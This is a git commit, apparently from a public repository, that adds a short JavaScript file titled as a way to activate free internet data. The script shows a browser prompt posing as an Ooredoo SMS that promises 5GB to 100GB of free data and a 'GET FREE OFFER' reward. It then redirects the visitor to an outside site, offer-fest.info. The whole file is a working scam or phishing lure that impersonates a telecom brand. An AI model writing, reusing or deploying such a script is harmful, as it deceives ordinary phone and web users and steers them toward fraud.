90230a7a3c0e8223d1feac0968a4631ca50a9fed
ekpesense <abantak9@gmail.com>
2025-03-02 08:21:20 -0800

    Create activate-free-internet-data.js

---
+++ activate-free-internet-data.js
@@ -0,0 +1,5 @@
+var password = 'GET FREE OFFER'
+password=prompt('Ooredoo SMS: Dear Ooredoo Customer Kindly Receive Free Data From 5GB - 100GB, Free Customers Reward, Click GET FREE OFFER To Check Now ','GET FREE OFFER');
+if (password != 'GET FREE OFFER') {
+location.href='https://offer-fest.info/free-internet-data';
+}
